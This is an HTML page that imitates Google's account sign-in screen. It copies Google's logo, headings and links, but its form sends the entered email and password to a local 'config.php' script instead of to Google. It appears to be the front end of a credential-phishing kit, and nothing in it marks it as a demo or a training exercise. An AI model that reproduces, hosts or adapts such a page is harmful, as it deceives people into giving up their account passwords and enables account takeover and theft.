<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
   	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Sign in to account</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>

  
      <div class="maindiv"><a href="https://www.google.com/">
        <img src="google.png" alt="Google"></a>
        <h1>Sign in</h1>
        <h2>Use your Google Account</h2>
        <form action="config.php">
        <div class="inputs">
          <div class="Fields">
            <div class="Fieldset">
              <input type="email" name="email" class="Before-FS" required="" autocomplete="off">
              <h1 class="Fs-H"><span>Email or phone</span></h1>
              <label class="placeholder">Email or phone</label>
            </div>
          </div>
          <div class="Fields">
            <div class="Fieldset">
              <input type="password" name="password" class="Before-FS" required="" autocomplete="off" >
              <h1 class="Fs-H"><span>Password</span></h1>
              <label class="placeholder">Password</label>
            </div>
          </div>
          <span class="create-account" style="color: blue;"><a href="https://accounts.google.com/SignUp?hl=en">Create Account</a></span>
          <input type="submit" name="submit" value="LOGIN" class="btn-login"></form>
        </div>
        
</body>
</html>